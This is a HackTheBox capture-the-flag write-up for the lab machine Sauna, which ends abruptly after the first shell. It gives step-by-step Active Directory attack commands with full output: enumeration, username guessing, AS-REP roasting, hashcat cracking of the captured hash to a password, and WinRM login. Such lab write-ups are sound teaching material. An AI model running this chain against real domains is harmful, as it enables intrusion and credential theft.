# CTF Penetration Testing

## Platform: HackTheBox

### Machine: [Sauna](https://www.hackthebox.com/machines/Sauna)

<img src="https://labs.hackthebox.com/storage/avatars/f31d5d0264fadc267e7f38a9d7729d14.png" alt="Sauna Machine Logo" width="150"/>

- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
- Machine difficulty: 🟩 Easy (<span style="color:#f4b03b;">4.5</span>)

> Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed, which results in hash for an account that doesn't require Kerberos pre-authentication. This hash can be subjected to an offline brute force attack, in order to recover the plaintext password for a user that is able to WinRM to the box. Running `WinPEAS` reveals that another system user has been configured to automatically login and it identifies their password. This second user also has Windows remote management permissions. `BloodHound` reveals that this user has the `DS-Replication-Get-Changes-All` extended right, which allows them to dump password hashes from the Domain Controller in a DCSync attack. Executing this attack returns the hash of the primary domain administrator, which can be used with `Impacket`'s `psexec.py` in order to gain a shell on the box as `NT_AUTHORITY\SYSTEM`.

#### Skills Required

- Basic knowledge of Windows
- Basic knowledge of Active Directory

#### Skills Learned

- ASREPRoasting Attack
- DCSync Attack

#### Tools Used

**Linux**:
- bloodhound
- gobuster
- hashcat
- impacket-GetNPUsers
- impacket-secretsdump
- impacket-wmiexec
- kerbrute
- ldapsearch
- netexec
- nmap
- evil-winrm
- username-anarchy

**Windows**:
- SharpHound.exe
- WinPEAS.exe

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig tun0`:
```
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.30📌 netmask 255.255.254.0  destination 10.10.14.30
        inet6 dead:beef:2::101c  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::816:4b70:a099:fdbb  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 160657  bytes 21519264 (20.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 163110  bytes 29889894 (28.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping 10.10.10.175`:
```
10.10.10.175 is alive
```

`sudo nmap -Pn -sSV -p- -T5 10.10.10.175`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 13:42 CET
Nmap scan report for 10.10.10.175
Host is up (0.12s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0🔍
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-21 20:47:32Z)🔍
135/tcp   open  msrpc         Microsoft Windows RPC🔍
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn🔍
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)🔍
445/tcp   open  microsoft-ds?🔍
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)🔍
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 374.79 seconds
```

`sudo nmap -Pn -sS --script=ldap-rootdse -p389 10.10.10.175`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 13:43 CET
Nmap scan report for 10.10.10.175
Host is up (0.15s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
|       ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna$@EGOTISTICAL-BANK.LOCAL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       serverName: CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|       isSynchronized: TRUE
|       highestCommittedUSN: 98479
|       dsServiceName: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       dnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL📌
|       defaultNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
|       currentTime: 20241121204315.0Z
|_      configurationNamingContext: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
Service Info: Host: SAUNA; OS: Windows

Nmap done: 1 IP address (1 host up) scanned in 1.02 seconds
```

`echo -e '10.10.10.175\tsauna.egotistical-bank.local sauna egotistical-bank.local' | sudo tee -a /etc/hosts`:
```
10.10.10.175    sauna.egotistical-bank.local sauna egotistical-bank.local
```

`netexec smb 10.10.10.175`:
```
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)📌
```

`netexec smb 10.10.10.175 -u '' -p ''`:
```
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\:🔑
```

`netexec smb 10.10.10.175 -u '' -p '' --shares`:
```
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
SMB         10.10.10.175    445    SAUNA            [-] Error enumerating shares: STATUS_ACCESS_DENIED               
```
❌

`netexec smb 10.10.10.175 -u '' -p '' --users`:
```                            
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\:
```
❌

`netexec smb 10.10.10.175 -u '' -p '' --rid-brute`:
```
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
SMB         10.10.10.175    445    SAUNA            [-] Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```
❌

`netexec smb 10.10.10.175 -u 'guest' -p ''`:
```
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\guest: STATUS_ACCOUNT_DISABLED
```
❌

The `smbclient` utility can be used to enumerate shares. Anonymous login is successful, but no shares are returned.

`smbclient --no-pass --list=10.10.10.175`:
```
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```
❌

`smbclient -U '' --no-pass --list=10.10.10.175`:
```
        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```
❌

`smbclient -U '' --list=10.10.10.175`:
```
Password for [WORKGROUP\]:
session setup failed: NT_STATUS_LOGON_FAILURE
```
❌

`rpcclient --no-pass 10.10.10.175`:
```
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```
❌

`rpcclient -U '' --no-pass 10.10.10.175`:
```
rpcclient $> netshareenum
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```
❌

Enumerating LDAP with `windapsearch`, we observe that anonymous binds are allowed. However, this doesn't return any domain objects.

`windapsearch.py -d 'egotistical-bank.local' --dc-ip 10.10.10.175 --users`:
```
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.175
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=EGOTISTICAL-BANK,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users

[*] Bye!
```
❌

We can try using `Impacket`'s `GetADUsers.py` as well, but this doesn't return any useful
information either.

`impacket-GetADUsers -dc-ip 10.10.10.175 'egotistical-bank.local/' -debug`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Connecting to 10.10.10.175, port 389, SSL False
[*] Querying 10.10.10.175 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
[+] Search Filter=(&(sAMAccountName=*)(mail=*)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))
```
❌

`ldapsearch -x -H ldap://10.10.10.175/ -b 'DC=egotistical-bank,DC=local' '(objectClass=*)'`:
```
# extended LDIF
#
# LDAPv3
# base <DC=egotistical-bank,DC=local> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# EGOTISTICAL-BANK.LOCAL
dn: DC=EGOTISTICAL-BANK,DC=LOCAL
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
instanceType: 5
whenCreated: 20200123054425.0Z
whenChanged: 20241120225235.0Z
subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==
uSNChanged: 98336
name: EGOTISTICAL-BANK

[...]

# Users, EGOTISTICAL-BANK.LOCAL
dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL

# Computers, EGOTISTICAL-BANK.LOCAL
dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL

# Domain Controllers, EGOTISTICAL-BANK.LOCAL
dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL

# System, EGOTISTICAL-BANK.LOCAL
dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL

# LostAndFound, EGOTISTICAL-BANK.LOCAL
dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL

# Infrastructure, EGOTISTICAL-BANK.LOCAL
dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL

# ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL
dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL

# Program Data, EGOTISTICAL-BANK.LOCAL
dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL

# NTDS Quotas, EGOTISTICAL-BANK.LOCAL
dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL

# Managed Service Accounts, EGOTISTICAL-BANK.LOCAL
dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL

# Keys, EGOTISTICAL-BANK.LOCAL
dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL

# TPM Devices, EGOTISTICAL-BANK.LOCAL
dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL

# Builtin, EGOTISTICAL-BANK.LOCAL
dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL

# Hugo Smith, EGOTISTICAL-BANK.LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL🔍

# search reference
ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST
 ICAL-BANK,DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST
 ICAL-BANK,DC=LOCAL

# search reference
ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC
 AL

# search result
search: 2
result: 0 Success

# numResponses: 19
# numEntries: 15
# numReferences: 3
```

`ldapsearch -x -H ldap://10.10.10.175/ -b 'DC=egotistical-bank,DC=local' -s sub '*' | grep 'lock'`:
```
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0📌
```

Let's proceed to examine the website.

`curl -I http://10.10.10.175`:
```
HTTP/1.1 200 OK
Content-Length: 32797
Content-Type: text/html
Last-Modified: Thu, 23 Jan 2020 17:14:44 GMT
Accept-Ranges: bytes
ETag: "4bdc4b9b10d2d51:0"
Server: Microsoft-IIS/10.0
Date: Thu, 21 Nov 2024 22:59:06 GMT
```

`gobuster dir -u http://10.10.10.175 -w ~/tools/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 15`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.175
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                ./tools/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   401,404,500,400
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,zip,html,php,bak,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 32797]
/images               (Status: 301) [Size: 150] [--> http://10.10.10.175/images/]
/contact.html         (Status: 200) [Size: 15634]
/about.html           (Status: 200) [Size: 30954]🔍
/blog.html            (Status: 200) [Size: 24695]

[...]
```

On navigating to `about.html` and scrolling down, we see a section containing full names of some Bank employees.

`firefox http://10.10.10.175/ &`

<img src="./assets/screenshots/hackthebox_sauna_http_about_html.png" alt="HackTheBox - Sauna | firefox http://10.10.10.175/about.html" width="700"/>

`vim ./site_users.txt`:
```
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
```

We can use a tool such as [`username-anarchy`](https://github.com/urbanadventurer/username-anarchy) to create common username permutations based on the full names. After saving the full names to a text file, we run the script.

`username-anarchy -i ./site_users.txt -f firstlast,first.last,flast,f.last,last.first,lfirst,last.first,first,last | tee ./site_users_anarchy.txt`:
```
fergus
fergussmith
fergus.smith
f.smith
fsmith
sfergus
smith
smith.fergus
hugo
hugobear
hugo.bear
h.bear
hbear
bhugo
bear
bear.hugo
steven
stevenkerb
steven.kerb
s.kerb
skerb
ksteven
kerb
kerb.steven
shaun
shauncoins
shaun.coins
s.coins
scoins
cshaun
coins
coins.shaun
bowie
bowietaylor
bowie.taylor
b.taylor
btaylor
tbowie
taylor
taylor.bowie
sophie
sophiedriver
sophie.driver
s.driver
sdriver
dsophie
driver
driver.sophie
```

`echo 'Administrator' >> ./site_users_anarchy.txt`

`kerbrute userenum --dc 10.10.10.175 -d 'egotistical-bank.local' ./site_users_anarchy.txt`:
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/21/24 - Ronnie Flathers @ropnop

2024/11/21 14:53:37 >  Using KDC(s):
2024/11/21 14:53:37 >   10.10.10.175:88

2024/11/21 14:53:37 >  [+] VALID USERNAME:       Administrator@egotistical-bank.local
2024/11/21 14:53:38 >  [+] VALID USERNAME:       fsmith@egotistical-bank.local👤
2024/11/21 14:53:38 >  Done! Tested 30 usernames (2 valid) in 0.456 seconds
```

`netexec smb 10.10.10.175 -u 'fsmith' -p 'fsmith'`:
```
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\fsmith:fsmith STATUS_LOGON_FAILURE
```
❌

`vim ./domain_users.txt`:
```
Administrator
FSmith
```

`impacket-GetNPUsers -dc-ip 10.10.10.175 'egotistical-bank.local/' -usersfile ./domain_users.txt`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:e5266589097e657f5a3278591c431d88$994f3818cc72c00ba5dbb0d077ab5d8acd55b4eeb3580c1595266a9c559804719f90128cbddf575352d3a088312de89b2f4f1cae127166ec0aabd40ff28cd958387183449d18628c8728befa37c7ed72ca38e9df65d9ed57c3b2b9168d1ec3884490a9fe6026735c99bb97ae5a395a6eaff38212cdb836b4e89c65b2d69ba5c627269cbd686a9b6758680bc1b7b998585ed9a7bb8cd80edc86a3c4a2a208d5947f751017953c1b89eeb807456aa8e9478075f94743905ef2c2c6dce658c28d5aedd805ef02add82e39277a5adcc964209bf42e39a90036578f49f643427b57febab76f7ccec2d079f20e4ba9caf696adb61b75e7379ea1d11aa51bb6d57ee869🧩
```

`vim ./krbasrep_hash.txt`:
```
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:e5266589097e657f5a3278591c431d88$994f3818cc72c00ba5dbb0d077ab5d8acd55b4eeb3580c1595266a9c559804719f90128cbddf575352d3a088312de89b2f4f1cae127166ec0aabd40ff28cd958387183449d18628c8728befa37c7ed72ca38e9df65d9ed57c3b2b9168d1ec3884490a9fe6026735c99bb97ae5a395a6eaff38212cdb836b4e89c65b2d69ba5c627269cbd686a9b6758680bc1b7b998585ed9a7bb8cd80edc86a3c4a2a208d5947f751017953c1b89eeb807456aa8e9478075f94743905ef2c2c6dce658c28d5aedd805ef02add82e39277a5adcc964209bf42e39a90036578f49f643427b57febab76f7ccec2d079f20e4ba9caf696adb61b75e7379ea1d11aa51bb6d57ee869
```

`hashcat --example-hashes | grep -i 'krb5asrep' -B12`:
```
Hash mode #18200
  Name................: Kerberos 5, etype 23, AS-REP
  Category............: Network Protocol
  Slow.Hash...........: No
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure, optimized
  Example.Hash.Format.: plain
  Example.Hash........: $krb5asrep$23$user@domain.com:3e156ada591263b8a...102ac [Truncated, use --mach for full length]
```

`hashcat -m 18200 ./krbasrep_hash.txt /usr/share/wordlists/rockyou.txt`:
```
hashcat (v6.2.6) starting

[...]

$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:e5266589097e657f5a3278591c431d88$994f3818cc72c00ba5dbb0d077ab5d8acd55b4eeb3580c1595266a9c559804719f90128cbddf575352d3a088312de89b2f4f1cae127166ec0aabd40ff28cd958387183449d18628c8728befa37c7ed72ca38e9df65d9ed57c3b2b9168d1ec3884490a9fe6026735c99bb97ae5a395a6eaff38212cdb836b4e89c65b2d69ba5c627269cbd686a9b6758680bc1b7b998585ed9a7bb8cd80edc86a3c4a2a208d5947f751017953c1b89eeb807456aa8e9478075f94743905ef2c2c6dce658c28d5aedd805ef02add82e39277a5adcc964209bf42e39a90036578f49f643427b57febab76f7ccec2d079f20e4ba9caf696adb61b75e7379ea1d11aa51bb6d57ee869:Thestrokes23🔑
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:e526658...7ee869
Time.Started.....: Thu Nov 21 15:00:37 2024 (21 secs)
Time.Estimated...: Thu Nov 21 15:00:58 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   518.4 kH/s (1.78ms) @ Accel:510 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10540680/14344385 (73.48%)
Rejected.........: 0/10540680 (0.00%)
Restore.Point....: 10538640/14344385 (73.47%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: TheySayImSkank5531 -> Texas06
Hardware.Mon.#1..: Util: 36%

Started: Thu Nov 21 15:00:12 2024
Stopped: Thu Nov 21 15:00:59 2024
```

`netexec smb 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'`:
```
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23🔑
```

`netexec smb 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' --shares`:
```
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
SMB         10.10.10.175    445    SAUNA            [*] Enumerated shares
SMB         10.10.10.175    445    SAUNA            Share           Permissions     Remark
SMB         10.10.10.175    445    SAUNA            -----           -----------     ------
SMB         10.10.10.175    445    SAUNA            ADMIN$                          Remote Admin
SMB         10.10.10.175    445    SAUNA            C$                              Default share
SMB         10.10.10.175    445    SAUNA            IPC$            READ            Remote IPC
SMB         10.10.10.175    445    SAUNA            NETLOGON        READ            Logon server share 
SMB         10.10.10.175    445    SAUNA            print$          READ            Printer Drivers📁
SMB         10.10.10.175    445    SAUNA            RICOH Aficio SP 8300DN PCL 6 WRITE           We cant print money
SMB         10.10.10.175    445    SAUNA            SYSVOL          READ            Logon server share📁
```

`netexec smb 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' --users`:
```
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
SMB         10.10.10.175    445    SAUNA            -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.10.175    445    SAUNA            Administrator                 2021-07-26 16:16:16 0       Built-in account for administering the computer/domain 
SMB         10.10.10.175    445    SAUNA            Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.10.175    445    SAUNA            krbtgt                        2020-01-23 05:45:30 0       Key Distribution Center Service Account 
SMB         10.10.10.175    445    SAUNA            HSmith                        2020-01-23 05:54:34 0👤
SMB         10.10.10.175    445    SAUNA            FSmith                        2020-01-23 16:45:19 0        
SMB         10.10.10.175    445    SAUNA            svc_loanmgr                   2020-01-24 23:48:31 0👤
SMB         10.10.10.175    445    SAUNA            [*] Enumerated 6 local users: EGOTISTICALBANK
```

`netexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'`:
```
WINRM       10.10.10.175    5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)🚀
```

`evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'`:
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents>
```
🐚

![Victim: fsmith](https://custom-icon-badges.demolab.com/badge/Victim-fsmith-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
egotisticalbank\fsmith
```

`whoami /all`:
```
USER INFORMATION
----------------

User Name              SID
====================== ==============================================
